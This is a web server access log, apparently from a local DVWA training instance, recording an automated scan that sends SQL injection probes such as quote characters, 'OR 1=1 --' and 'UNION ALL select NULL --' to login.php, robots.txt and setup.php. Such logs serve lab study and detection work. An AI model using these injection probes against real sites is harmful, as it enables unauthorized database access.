172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%3B HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=%27 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=query%27 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=%22 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=query%22 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=%3B HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=query%3B HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=%29 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=query%29 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=query+AND+1%3D1+--+ HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=query+AND+1%3D2+--+ HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=query+OR+1%3D1+--+ HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=query+AND+1%3D2+--+ HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=query+OR+1%3D1+--+ HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /robots.txt HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php?query=%27 HTTP/1.1" 200 10897 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php?query=query%27 HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php?query=%22 HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php?query=query%22 HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php?query=%3B HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php?query=query%3B HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php?query=%29 HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php?query=query%29 HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php?query=query+AND+1%3D1+--+ HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php?query=query%22+AND+%221%22%3D%221%22+--+ HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php?query=query+AND+1%3D1 HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php?query=query%27+AND+%271%27%3D%271 HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php?query=query%22+AND+%221%22%3D%221 HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 4366 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "GET /setup.php HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=%27 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=query%27 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=query%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=%3B HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=query%3B HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=%29 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=query%29 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=query+AND+1%3D1+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=query+AND+1%3D2+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=query+OR+1%3D1+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=query+AND+1%3D2+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=query+OR+1%3D1+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:31 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
